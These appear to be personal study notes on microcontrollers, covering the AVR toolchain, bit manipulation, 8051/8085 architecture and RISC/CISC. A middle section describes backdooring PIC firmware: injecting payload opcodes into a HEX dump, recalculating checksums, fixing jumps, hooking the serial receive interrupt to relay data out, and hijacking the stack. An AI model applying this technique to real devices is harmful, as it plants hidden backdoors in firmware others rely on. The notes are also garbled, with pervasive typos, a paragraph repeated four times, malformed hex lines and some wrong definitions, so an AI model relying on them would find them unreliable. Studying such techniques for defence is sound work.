a microcontroller is a small and low-cost microcomputer, which is designed to perform the specific tasks of embedded systems like displauing microwave's informaton, receiving remote signals, etc.

the general microcontroller consists of the proceessor, the memory(RAM,ROM,EPROM eerasable programmable read-only memory), serial ports, peripherals(timers, counters),etc.

microcontrollers are divided into various categories based on memory, architecture, bits and instructiion sets.

based on bit configuration:
-8 bit microcontroller
	this type of microcontroller is used to execute arithmetic and logical opeerations like addition, subtraction, muluplication division, etc. For example, intel 8031 andd 8051 are 8 bits microcontroller
-16 bit microcontroller
	this type of microcontrollere is used to perform arithmetic and logical operations where high accuracy and performance is required. For example, intel 8096 is a 16-bit microcontroller
-32 bit mircocontroller
	this type of microcontroller is generally used in automatically controlleedd appliances like automatic operational machines, medical applicances, etc.

based on memory configuration:
-external memory microcontroller
	this type of microcontroller is designed in such a way that they do not have a program memory on the chip. Hence it is named as external memory microcontroller. For example, Intel 8031 microcontroller
-embedded memory microcontroller
	this type of microcontroller is designed in such a way that the mircrocontroller has all programs and data memory, counters and timers, interrupts, I/O ports are embedded on the chip. For example. Intel 8051 microcontroller

based on the instruction set configuration
-CISC, complex instruction set computer, it allows the user to inset a single instruction as an alternative to many simple instructions
-RISE, reduced instruction set computers, it reeduces the operational time by shortening the clock cycle oer instruction

===
int mitch = 74l;
int* pointerToMitch = &mistch;
*pointeerToMitch =55;//dereference and set
*((volatitle byte*)0x25)=32;

volatile keyword prevents an optimizing compiler from optimizing away subsequent reads or writes and thus incorrectly reusing a state value or omitting writes.

#define MITCHB *((volatile char*)0x25)
MITCHB = 32;

use a crystal oscillator as an external clock 

Fuse bitss, also known as fuses or configuration bits, are settings made in icrocontrollers to control certain operations that are not normally changed during the execution of the program code, unlike registers.

avrdude to upload and flash code to MCU
-change fuse
-upload code
./avrdude
avrdude -C ../etc/avrdude.conf -p atmega328p -c usbtiny -U lfuse:w:0xF2:m
/applications/Arduino.app/Contents/java/hardware/tools/avr/bin
notes: delay() in Arduino waits a certain amount of clock cycles. Changing the oscillator means changing the clock speed, thus it waits a diiferent amount of time.

c code -> assembly -> machine code
compiler, assembler

avr-gcc -mmcu=atmega328p dummy.c
hexdump a.out
./a.out

----
text(code)
----
data(varible)
----
stack
|
V growth
----
free
----
^growth
|
heap
----

converts it to a hex file before upload
avr-objcopy -O ihex -j .text -j .data a.out a.hex

use avrdude to upload
avrdude -C /usr/local/Cellar/avrdude/6.3_1/etc/avrdude.conf -v -p atmega328p -c usbtiny -U flash:w:a.hex

avr-gcc compile C code to machine code
avr-objcopy translate from raw binary to "intel hex" format
avrdude upload machine code to thee microcontroller

for my redboard 
avrdude -C /usr/local/Cellar/avrdude/6.3_1/etc/avrdude.conf -v -p atmega328p -c stk500v1 -P /dev/tty.usbserial-DN02Z1QJ -U flash:w:/Users/chenshen/Desktop/FreeRTOS710-template-for-ATmega328P-master/main.hex -F

preprocessor automated copy/paste
its convention to write the keyword in ALL CAPS so other people recognize that you are using a preprocessor macro
#define FIND replace

linkers
so there is no need to recompile each library everytime
By default, avr-gcc runs the linker
We can add rhe -c flag to ddo a compile only operation.

avr-gcc -c -mmcu=<microcontroller> <sourceFile>
generates .o file

avr-gcc -mmcu=<microcontroller> <machineCode1><machineCode2><machineCode3>
generates excutable file

.h file for prototypes for functions
avr-gcc -c ... stop after compile+assemble
avr-gcc -E ... stop after preprocessor
avr-gcc -S ... stop after compile

example1:
#idndef MITCHISCOOL
#define MITCHISCOOL 1234
void delay(long)
...
#endif

example2:
#ifnddef __TIMING_H__
#define __TIMING_H__
...
#endif

bit banging(bitwise operations)
PORTB =PORTB|32 (turn one bit on)
10001010
00100000 or |
10101010

PORTB =PORTB&233 (turn one bit off)
10101010
11011111 and &
10001010

bit shifting
PORTB =PORTB<<1

PORTB |=(1<<5)
10001010
00100000 1<<5 or
10101010

PORTB &= ~(1<<5)
10101010
11011111 ~(1<<5) and
10001010 

bit banging(toggle)
PORTB =PORTB^(1<<5)
10101010
00100000 xor
10001010

10001010
00100000 xor
10101010

Turn PB5 on: PORTB |= (1<<5)
Turn PB5 off: PORTB &= ~(1<<5)
Toggle PB5: PORTB ^=(1<<5)

----
STM32
HAL layer

fake analog PWM pulse width modulation
real analog DAC digital to analog converter

duty cycle: percentage of time the pin is ON during the cycle
resolution: the number that we count to. number of possible duty cycle settings
frequency: the number of times we repeat the cycle per second

example:
system clock is 72MHZ -> we can count 72 million times each second
8-bit resolution(0-255) -> each cycle is 256 counts
the PWM frequency is 72 000 000 / 256 = 218250 cycles,218KHZ 

anode positve
cathode negative
VSS voltage source GND
VDD voltage drain

---
DDRAM:data display random access memory
 it is the working data buffer of the display
 each character on the display has a correspinding DDRAM location 
 and the byte loadeed in DDRAM controls which character is displayed
CGROM:characteer generation read only memory
 holds all the standard patterens for 5*7 dor matrix characters
CGRAM:character generation random access memory
 allows the user to define speacial supplementary non-standard character types that are enot in the CGROM
 you can load your own dot pattern shapes and call these up for display


instructions to use a LCD display
clear display
return home
entry mode set: set the moving direction of cursor and display
display on, No cursor
write data to screen

bouncing occurs for switches, addding a capacitor could solve the problem

avr-gcc -mmcu=atmega328p -c main.c
avr-gcc -mmcu=atmega328p main.o FreeRTOS/Source/tasks.o FreeRTOS/Source/croutine.o FreeRTOS/Source/list.o FreeRTOS/Source/queue.o FreeRTOS/Source/timers.o FreeRTOS/Source/extras/comtest.o FreeRTOS/Source/portable/GCC/ATMega328/port.o  FreeRTOS/Source/portable/GCC/ATMega328/extras/serial.o  FreeRTOS/Source/portable/MemMang/heap_1.o -o main
avr-objcopy -O ihex -j .text -j .data main main.hex
avrdude -C /usr/local/Cellar/avrdude/6.3_1/etc/avrdude.conf -v -p atmega328p -c stk500v1 -P /dev/tty.usbserial-DN02Z1QJ -U flash:w:/Users/chenshen/Desktop/FreeRTOS710-template-for-ATmega328P-master/main.hex -F

===
interface, is the path for communication betweeen two components.
interfacing is of two types, memory interfacing and I/O interfacing

memory interfacing
when we are executing any intruction, we need the microproceessor to access the memory for reading instruction codes and the data stored in the memory.
for this, both the memory and the microprocessor requires some signals to read from and write to registers
the intercaing process includes some key factors to match with the memory requirements and microprocessor signals. the interfacing circuit therefore should be designed in such a way that it matches thee memory signal requirements with the signals of the microprocessor

IO interfacing
there are various communication devices like the keyboard, mouse, printer, rtc. 
we need to interface the keyboard and other devices with the micropressor byusing latches and buffers. this type of interfacing is known as IO interfacing

serial communication interface
	in this type of communication, the interface gets a signal byte of data from the microprocessor and sends it bit by bit to the other system serially and vice-a-versa
parallel communication interface
	in this type of communication, the interface gets a byte of data from the microprocessor and sends it bit by bit to the other systems in simultaneous or paralleel fashion and vice-a-versa
===
8051, it is an 8-bit microcontroller. it is built with 40 pins DIP(dual inline package), 4kb of ROM storage and 128 bytes of RAM storage, 2 16-bit timers. An on-chip verystal oscillator is intergrated in th microcontroller having crystal freequency of 12MHZ

the system bus connects all the support devices to the CPU.
the system bus consists of an 8-bit data bus, a 16-bit address bus and bus control signals. all other devices like program memory, ports, data emmory, serial interface, interrupt control, timers and the CPU are all interfaced together through the system bus

Pin 29: PSEN, program store enable, it is used to read a signal from the external program memory
Pin 30:EA, external access input, it is used to enable/disable the external memory interfacing
Pin 31:ALE, address latch enable, it is used to demultiplex the address-ddare signal for port

===
assembling a program
the host system and the tarfet system is different
specify how to transform the source code into machine code, where to locate the machine code in the target system memory, how to load the program from the host system into the target system

the final program that runs on the MCU target computer is called an executable program or simply an "executable"
1. create an assembly progtram(.asm or .s)
2. an assembler which converts the source code into a binary form suitable for the MCU(croess-assembler). The assembler generates an object file that hasa .o extension can contains what people call object code. 
the object file is in a format called an ELF(extensible linking and format)/DWARF(is also a standard file fomat for the information generated bu compilers, assemblers and linkers) format, and in addition to machine code, it has a certain amount of overhead data
3. the .o file created bu the assembler is an intermediate file that has the essential MCU machine language, but it still needs to be modified somewhat.
for instance, it may need to be combined or linked with other object code files, such as library routines, to create the final profram that will actually run on the microcontroller. it may also need to resolve addresses which are not known unitl other files are linked with it.
	the job of the linker is to create a complte machne code file that is almost ready to run on the MCU. the linker does this by filling in the unresolved addreesses and by linking related programs to create the final program.
	the file created by the linker is called an absolute file and has a .abs file extension. the absolute file contains the executable machine code that will be used by the MCU, and it also has overhead information such as address assignments for the code, etc. the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation
 the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation
4. in the next step, we convert the absolute .abs file into a form suitable for a loader to use.
the loader is a program that will transfer the executable program from the host system to the target system. the loader requires that the executable machine code inforamtion in the .abs file be formatted in a ceratin way. we do this by converting the executablee machine code information in the .abs file into short chunks of code, called "S-records" by Motorola.
each S-record is a line of text containing a header, the address where the machine code will be loaded, the machine code itself, and some extra checksum bits to make sure that the transfer was successful.
the final program that we will download to the MCY consists of a bunch of these S-reords in one file which has a file exteenskon ".s1" or ".sx"
5.finally, we must transfer the .s1 file from the host PC to the target MCU. this is done using a program called a loader. There are serveeral tyoes of loaders depending on the connection between the host system and the target system, and depending on the format of the file to be transferreed.

===
backdooring hardware devices by injecting malicious payloads on microcontrollers
https://www.youtube.com/watch?v=s326a_HELuw&ab_channel=HackersOnBoard

mircroprocessors, Intel, AMD, ARM
microcontrollers, microchip, ATMEL, ST

microprocessors overview
- microprocessors = CPU
- memories and I/O busses are physically separated
- usually bigger than a microcontroller
- greater processing capacity
- input -> microprocessor(ALU, registers, etc) -> output
								^
								|
								v	
							memory	
- modified-harvard memory organization
- 32 or 64 bits(most common)	

mircrocontrollers overview
- microcontrollers = CPU + RAM + ROM + I/O busses
- smaller CPU with less processing capacity
- usually smaller size than microprecessors
- CPU, internal oscillator, RAM, ROM, peripherals, I/O busses, others
- harvard memory organizatiojn
- 16 bits (most common)
- a little stack

Raspberry PI, ARM microprocessor
Arduino UNO, atmega microcontroller

microcontrollers programming
user -> 		C file						hex file	
|							|									|
v							v									V
ASM file <- compiler					programmer software
|																|
v																v
assembler -> hex file					programmer hardware => uC

PIC program memory dump
- program memory, non-volatile
- data memory (RAM), SFR(special function registers), GPR (general purpose registers), volatile
- data flash/ EEPROM memoty (ROM), non-volatile

PIC program standard structure
# include files
PIC config directives
program constants
RAM variables
resert vector 0x0000; goto start, reset vector: always at 0x0000 memory address
interrupt vector 0x0008, interrupt vector: at 0x0008 and 0x0018 memory address
	interrupt routine #1
	interrupt routine #2
start: , program entry pointo
	program main code
	
ASM source code:
REST_VECT CODE 0x0000
	GOTO START

; TODO add interrupts here is used

MIAN_PROG CODE

START
	CLRF PORTD	; clear PORTD
	MOVLw B'00000000'
	MOVWF TRISD ; set all to output

	BSF PORTS,2	; turn on LED
	GOTO $	; loop forever

END

disassembly:
line address opcode disassembly
1			0000		EF03	GTO 0x6
2			0002		F000	NOP
3 		0004		0000	NOP
4			0006		6A83	CLRF PORTD,access
5			0008		0E00	MOVLW 0x0
6 		000A		6E95	MOVWF TRISD, access
7			000C		8483	BSF PORTD, 2, access
8			000E		EF07	GOTO 0xE
9 		0010		F000	NOP
* access word, data access memeory is performed, because PORTD and TRISD are SFR located at RAM

opcodes in the .hex dump
: 020000040000FA
: 1000000003EF00F00000836A000E956E838407EF13
: 1000100000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE
: 10002000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE0
: 10003000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFD0
* match the assembly instructiuon in opcodes, however, they are inverted, because of the little endian format to store bits in memory
* entry point: 0x06, memory address to inject

generating the payload, malicious
BCF TRISD,1 // set pin as output
BSF PORTD,1 // turn on a LED
BCF TRISD,2 // set pin as output
BSF PORTD,2 // turn on a LED
* use the specific assembly instruction set for the target device
* in order to get the opcode, writing all the assembly instructions of the payload in an assembly file inside MP lab IDE and then compile it to get the disassembly view and get the opcodes

0000 NOP
9295 BCF TRISD, 1, access
8283 BSF PORTD, 1, access
9495 BCF TRISD, 2, access
8243 BSF PORTD, 2, access
0000 NOP
Little Endian: 0x9592 0x8382 0x9594 0x8384

exmaple, entry point at 0x28
line address opcode disassembly
1			0000		EF14	GOTO 0x28
2			0002		F000	NOP
3			0004		0000	NOP

original program memory(.hex dump)
: 02 00 00 04 00 00 FA
: 10 00 00 00 14 EF 00 F0 00 00 0E 0E 04 6E 48 0E 07 6E 50 0E 46
: 10 00 10 00 09 6E 04 00 09 2E 0A EF 00 F0 07 2E 07 EF 00 F0 2A
: 10 00 20 00 04 2E 05 EF 00 F0 00 0C 00 0E 95 6E 83 8C 03 EC 9F
: 10 00 30 00 00 F0 83 9C 03 EC 00 F0 16 EF 00 F0 FF FF FF FF E1
* 0C is the entry point offset
* end of every line, there is a checksum, 46, 2A, 9F, E1

payload injected at entry point (ox28)
: 02 00 00 04 00 00 FA
: 10 00 00 00 14 EF 00 F0 00 00 0E 0E 04 6E 48 0E 07 6E 50 0E 46
: 10 00 10 00 09 6E 04 00 09 2E 0A EF OO F0 07 2E 07 EF 00 F0 2A
: 10 00 20 00 04 2E 05 EF 00 F0 00 0C 95 92 83 82 95 94 83 84 9F
: 10 00 30 00 00 0E 95 6E 83 8C 03 EC 00 F0 83 9C 03 EC 00 FD E1
: 10 00 40 00 16 EF 00 F0 FF FF FF FF FF FF FF FF FF FF FF FF C0
* need to recaluculate the checksum

checksum recalculation
- Sum(bytes on the line) = Not + 1 = checksum
- exmaple: :1000000003EF00F00000959E838E836A000E956E
	10 + 00 + 00 + 00 + 03 + EF + 00 + F0 + 00 + 00 + 95 + 9E + 83 + 8E + 83 + 6A + 00 + OE + 95 + 6E = Ox634
	Not(0x634) +1 = 0xFFFF 0xFFFF 0xFFFF 0xF9CC
	checksum = 0xCC

paylay injected and checksum fiexed
: 02 00 00 04 00 00 FA
: 10 00 00 00 14 EF 00 F0 00 00 0E 0E 04 6E 48 0E 07 6E 50 0E 46
: 10 00 10 00 09 6E 04 00 09 2E 0A EF OO F0 07 2E 07 EF 00 F0 2A
: 10 00 20 00 04 2E 05 EF 00 F0 00 0C 95 92 83 82 95 94 83 84 52
: 10 00 30 00 00 0E 95 6E 83 8C 03 EC 00 F0 83 9C 03 EC 00 FD C3
: 10 00 40 00 16 EF 00 F0 FF FF FF FF FF FF FF FF FF FF FF FF C7

INTCON, a readable and writeable register which contains the various enablee bits for all interrupt sources
GIE EEIE TMR0IE INT0IR RBIE TMR0IF TMR0IF INT0IF RBIF
- interruptions enabled
	BSF INTCON, GIE
	BSF INTCON, EEIE
- GIE, the flobal interrupt enable bit
	EEIE, EE wrtie complete interrupt enable bit
  TMR0IE, timer0 interruption enabled
	TMR0IF, timer0 interruption flag
- multiple peripheral interrupt enable registers (PIE1, PIE2)	
	they have interruption enabling bits and interruption flags bits

example:
	address opcode disassembly
	000E		BA9E		BTFSC PIR1, 5, access
	0010		EC24		CALl 0x48, 0

	* bit 5 in PIR1 (peripheral interrupt request) is RCIF
	* communication peripherals when the microcontrollers receives datafrom any communication protocol it wil trigger an interruption that will set this specific flag to one.
	* if this flag is to one, the call will be executed jumping to a core routine located at 0x48	

	cook a payload that makes a relaying of the received data to a TX peripheral which we are able to monitor externally
	MOVF RCREG, W //move the received data to W register
	BSF	TXSTA, TXEN	// enable transmission
	BCF TXSTA, SYNC // set asynchronous operation
	BSF RCSTA, SPEN // set TX/CK pin as an output
	MOVWF TXREG	// move received data(in W) to TXREG to be re-transmitted
	opcode:
	50AE
	8AAC
	98AC
	8EAB
	6EAD
	with little endian: AE50AC8AAC98AB8EAD6E

example:
address opcode disassembly
0014		B4F2		BTFSC INTCON, 2, access
0016		EC27		CALl 0x4E, 0
0018		F000		NOP
001A		BC9E		BTFSC PIR1, 6, access
001C		EC2B		CALl 0x56, 0 
001E 		F000		NOP
0020		B2F2		BTFSC INTCON, 1, access
0022 		EC2B		CALl 0x5E, 0
0024		F000		NOP

- 0x48 to inject a payload at the RC interruption
- 0x4E to inject a payload at timer0 interruption
- 0x56 to inject a payload at the AD interruption
- 0x5E to inject a payload at the INT0 interruption

fixing jumps, flow corruption
call 0x10, and 0x10 is changed after payload injection

GOTO opcode 0xEF
CALl opcode 0XEC
NOP opcode 0xF0
* in PIC18 microcontrollers, the assembly instructions are 16 bits in length
* 8 bits are used for the opcode and 8 bits for the memory address to jump or goto
* but 2 more bytes are reserved in case of needing jumo in more than 2255 positions.
EF06 F000 = GOTO jumping to 0x0006 offst (0x000C = 0x0006 * 2 memory address)
EC67 F004 = CALl jumping to 0x467 offset (0x08CE = 0x0476 * 2 memory address)

fixing jump, recalculation
payload injected at memoty address: 0x48
paylaod length: 10 bytes
emample:
	call 0x56 (EC2B F000) -> original jump
	call 0x60 (EC30 F000) -> fixed jump, original offset + payload length
	10 bytes = 80 bits = 10 memeory address, 10 /2 = 5. 2B + 5 = 30

stack payload injection, controlling program flow
STKPTR, stack pointer register
TOSU, TOSh, TOSL, top of stack registers

top of stack 001A34h 00010
						 000D58h 00001
TOSU 00h, TOSH 1Ah, TOSL 34h
stack pointer STKPTR 00010 <4:0>

INCF STKPTR, F //SP increment
MOVLW 0x00
MOVWF TOSU // TOSU = 0x00
MOVLW 0x0C
MOVWF TOSH // TOSH = 0x0C
MOVLW 0x72
MOVWF TOSL // TOSL = 0x72
RETURN
jump to 0x000C72

===
microprocessor

microprocessor is a controlling unit of a micro-computer, fabricated on a small chip capable of performing ALU(arithmetic lofical unit) operations and communicating with the other devices connected to it.

microprocessor consists of an ALU, register array, and a control unit.
-ALU performs arithmetical and logical operations on the data received from the memory or an input device.
-register array consists of registers identified by letters like B, C, F, E and accumulator
-the control unit controls the flow of data and instructions within the computer

fetch, decode, execute

initially, the instructions aree stored in the memory in a sequential order
the microprocessor fetches those instructiions from the memory
then decodes it and executes those instructions till STOP instruction is reached
later, it sends the result in binary to the output port
between these processes, the register storees the temporarily data and ALU performs the computing functions

instruction set, it is the set of instructions that the microprocessor can understand
bandiwidth, it is the number of bits processed in a single instruction
clock speed, it determines the number of bits processed in a single instruction
word length, it depends upon thee width of internal data bus, registers, ALU. eetc. An 8-bit microprocessor can process 8-bit data at a time. The word length ranges from 4 bits to 64 bits depending upon the type of the microcomputer

some of the most prominent features of any microprocessor
-cost effective, the microprocessor chips are available at low prices and results its low cost
-size, the microprocessor is small size chip, hence is portable
-low power consumption, microprocessors are manufactured by using meetaloxide semiconductor technology, which has low poweer consumption
-versatility, the microprocessors are versatile as we can use the same chip in a number of applications by configuring the software program
-reliablity, the failure rate of an IC in microprocessors is very low

===
microprocessor
-RISC processors, also called load/store architecture
-CISC processors
-special processors

===
RISC stands for reduced instruction set computer
it is designed to reduce the execution time by simplifying the instruction set of the computer
using RISC processors, each instruction requires only one clock cycle to execute results in uniform execution time
this reduces the efficiency as there are more lines of code, hence more RAM is needed to store the instructions.
the compiler also has to wotk more to convert high-level language instructions into machine code
some of the RISC processors are:
power PC:601, 604, 615, 620
DEC Alpha:210642, 211066, 21068, 21164
MIPS:(R100000) RISC processor
PA-RISC:HP 7100LC

architecture of RISC
RISC microproceessor architecture uses highly-optimiized set of instructions, it is used in portable devices like apple ipod dudee to its power efficiency

characteeristics of RISC
-it consists of simple instructions
-it supports carious data-type formats
-it utilizes simple addressing modes and fixed length instructions for pipelining
-it supports reegister to use in any context
-one cycle execution timee
-"LORD" and "STORE" instructions are used to access the memory location
-it consists of larger number of registers
=it consists of less number of transistora

===
CISC, stands for complex instruction set computer
it is designed to minimize the number of instructions per program, ignoring the number of cycles per instruction
the emphasis is on building compleex instructions directly into the hardware

the compiler has to do very littlee work to translate a high-level language into assembly level langue/machine code because the length of the code is relatively short, so very little RAM is reequired to store the instructions

some of the CISC processors are
IBM 370/168
VAX 11/780
Intel 80486

its architecture is designed to decrease the memory cost becuase more storage is needed in larger programs resulting in higher memory cost. To resolve this , the number of instructions per program can be reduced by embedding the number of operations in a signle instruction

characteristics of CISC
-varity of addressing modes
-larger number of instructions
-variable length of instruction formats
-several cycles may be required to execute one instruction
-instruction-decoding logic is complex
-one instruction is required to support multiple addressing modes

===
special processor, theree are the processors which are designed for some special purposes.

coprocessor
a coprocessor is a specially designed microprocessor, which can handle its particular function many times faster than the ordinary microprocessor
for example, math coprocessor
some Intel math-coprocessors are
8087-used with 8086
80287-used with 80286
80387-used with 80386

input/output processor
it is a specially designed microprocessor having a local memory of its own, which is used to control I/O devices with minimum CPU involvement
for example, DMA(direct memory access) controller
	keyboard/mouse controller
	graphic display controller
	SCSI port controller

Transputer(transistor computer)
a transputer is a specially designd microprocessor with its own local memory and having links to connect one transputer to anotheer transputeer for inter-processor communications. 
It was first deisgned in 1980 by lnmos and is targeted to the utilization of VLSI(veery large0scale integration) technology
a transputeer can be used as a single processor system or can be connected to external links, which reduces the construction cost and increases the performance.

DSP(digital signal processor)
the processor is specially designed to process the analog signals into a figital form.
this is done by sampling the voltage level at regular time intervals and converting the voltage at that instant into a figital form.
this process is performeed by a circuit callede an analogue to digital converter, A to D converter or ADC
A DSP contains the following components
-program memory, it stores the programs that DSP will use to process data
-data memory, it stores the information to be processed
-compute engine, it performs the mathematical proceessing, accessing the program from the program memory and the data from the data memory
-input/output, it connects to thee outside world
its applications are
-sound and music synthesis
-audio and video compression
-video signal proceessing
-2D andd 3D graphics acceleration
for example, texas instrument;s TMS 320 series, e.g. TMS320C40, TMS320C50

===
8085 microprocessor functional units
-accumulator
	it is an 8-bit register used to perform arithmetic, logical, I/O & LOAD/STORE operations. it is conneected to internal data bus &ALU
-arithmetic and logic unit
	it performs arithmetic and logical operations like addition, subtraction, AND, OR, etc. on 8-bit data
-general purpose register
	there are 6 geneeral purpose registers in 8085 processor, i.e.B,C,D,E,H,L. each register can hold 8-bit data
	these registers can work in pair to hold 16-bit data and their pairing combination is like B-C, D-E,H-L
-program counter
	it is a 16-bit register used to store the memory address location of the next instruction to be executed. Mircroprocessor increments the program whenever an instruction is being executed, so that the program counter points to the memory address of the next instruction that is going to be executed
-stack pointer
	it is also a 16-bit registeere works like stack, which is always invremented/decremented by 2 during push&pop operstions	
-temporary register
	it is a 8-bit register, which holds the temporary data of arithmetic and logical operations
-flag reegisteer
	it is an 8-bit reegister having five 1-bit flip-flops, which holds either 0 or 1 depending upon the result stored in the accumulator
	these are the set of 5 flip-flops
	sign(S)
	zero(Z)
	auciliary carry(AC)
	parity(P)
	carry(C)	
-instruction regiser and decoder
	it is an 8-bit register. When an instruction is fetched from memory then it is stored in the instruction register. Instruction decoder decodes the information present iin the instruction register.
-timing and control unit
	it provides timing and control signal to the microprocessor to perform operations. 
	following are the timing and control signals, which control external and internal circuits
	control signals: READY, RD, WR, ALE
	status signals: S0, S1, IO/M
	DMA signals: HOLD, HLDA
	reset signalsL RESET IN, RESET OUT
-interrupt control
	it controls the intrrupts during a process.
	when a microprocessor is executing a main program andd whenever an interrupt occurs, the microproceessor shifts the control from the main program to process the incoming request. after the reequest is completed, the control goes back to the main program
	there are 5 interrupt signals in 8085 microproceessorL INTR, RST 7.5, RST 6.5, RST 5.5, TRAP
-serial input/output control
	it controls the serial data comunication by using these two instruction SIC(serial inout data), and SOD(serial output data)
-address buffer and address-data buffer
	the content stored in the stack pointer and profram counter is loaded intothe address buffer and address-data buffer to communicate with CPU. 
	the memory and I/O chips are connected to these buses.
	the CPU can exchange the deesired data with the memory and I/O chips
-address bus and data bus
	data buses carries the data to be stored. it is bidirectional
	address buses carries the location to where it should be stored and it is unidirectional

addressing modes in 8085
there are the instructions used to transfer the data from one register to another register, from the memory to the refister, and from the register to the memory
-immediate addressing mode
	in this mode, the 8.16 bit data is specified in the instruction itself as one of its operand. For example: MVI K, 20F: means 20F is copied into register K
-register addressing mode
	in this mode, the data is copied from one register to another. For example: MOVE K, B:means data in reegister B is copied to register K.
-direect addressing mode
	in this mode, the data is directly copied from the given address to the register. For exampkle: LDB 500K:means the data at address 5000K is copied to register B
-indirect addressing mode
	in this mode, the data is transferreede from one register to another by using the address pointed bu the register. For example: MOV K,B:means data is transferred from the memory address pointed by the register to the register K
-implied addressing mode
	the mode doesnt require any operand; the data is speecified by the opccode itself. For example:CMP

interrupts in 8085
inteerrupts are the signals generated by the external devices to request the microprocessor to perform a task
-vector interrupt
	in this type of interrupt, the interrupte address is known to thee processor
-non vector interrupt
	in this type of interrupt, the interrupte address is not known to thee processor, so the interrupt needs to be sent externally by the device to perform interrupts
-maskable interrupt
	in this type of interrupt, we can disable the interrupt by writing some instructions into the program
-non maskable interrupts
	in this type of interrupt, we can not disable the interrupt by writing somee instructions into the program
-software interrput
	in this type of interrupt, the programmer has to add the instructions into the program to execute the interrupt
-hardware interrupt

INTA is not an interrupt, it is used by the microproceessor for sending acknowledgement

interrupt service routine(ISR)
a small program or a routine that when executed, services the corresponding interrupting source

===
8086 is an enhaced version of 8085

8086 microprocessor is divideed into two functonal units
EU(execution unit)
BIU(bus Interface unit)

===
multiprocessor 
multiprocessor mmeans a multiple set of processors that executes instructions simultaneously
there aree three basic multiprocessor cconfigurations
-coproceessor configurations
-closely coupled configuration
-loosely coupled configuration

===
# AVR
- interrupt vector table
  - located in FLASH memory
  - starts at 0x0000
  - 0000 reset
  - 0002 external interrupt. pin16
  - 000c watchdog timeout
  - 0024 UART/serial receive/complete
- interrupt occurs
  - check if it is enabled
  - store PC on the stack
  - load PC from the interrupt vector
  - RETI, return from  interrput
    - pop PC from stack
    - set "I" bit, back to interrupt enable 
- bootloader on board receieves the executable and writes it to flash
- servor motor
  - analog, vary the voiltage
  - PWM
    - cycle time 20ms(50HZ)
    - pulse width 0ms = 0%, 20ms = 100%

